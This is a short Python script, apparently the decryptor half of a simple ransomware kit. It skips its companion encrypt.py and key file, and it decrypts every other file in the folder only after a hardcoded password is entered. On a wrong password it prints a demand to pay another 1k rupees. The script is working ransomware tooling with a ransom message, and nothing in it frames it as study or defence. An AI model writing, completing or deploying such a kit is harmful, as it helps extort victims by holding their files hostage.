#!/usr/bin/env python3
#Ephraim James

import os
from cryptography.fernet import Fernet


files = []
secret="secretkey.key"
for file in os.listdir():
    if file == "encrypt.py" or file == secret or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)
 
 
password="coffe"
user=input("Enter Password  to decrypt Your files:")


if  password == user:
        #key=Fernet.generate_key()
        with open(secret,"rb") as key:
                password=key.read()
        for file in files:
            with open(file,"rb") as thefile:
                contents=thefile.read()
            content_decrypted=Fernet(password).decrypt(contents)

            with open(file,"wb") as thefile:
                thefile.write(content_decrypted)
                print(f"{file} is Successfully Decrypted")

else:
     print("Wrong password You can pay Another 1k Rupees/-")

 
     